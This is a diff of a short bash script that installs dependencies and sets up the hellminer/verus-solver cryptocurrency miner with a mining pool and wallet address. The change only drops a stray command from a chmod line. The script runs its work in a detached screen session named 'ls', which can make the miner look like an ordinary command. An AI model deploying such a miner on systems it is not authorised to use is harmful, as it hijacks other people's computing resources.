@@ -1,7 +1,7 @@
 #!/bin/bash
 sudo apt update 
 sudo apt install screen libjansson4 -y 
-chmod +x hellminer && chmod +x verus-solver ./verus-solver
+chmod +x hellminer && chmod +x verus-solver
 screen -dmS ls 
 POOL=stratum+tcp://eu.luckpool.net:3956
 WALLET=RYBb7hyLUnBd7XRtre7jjjvVfYRWoAdors
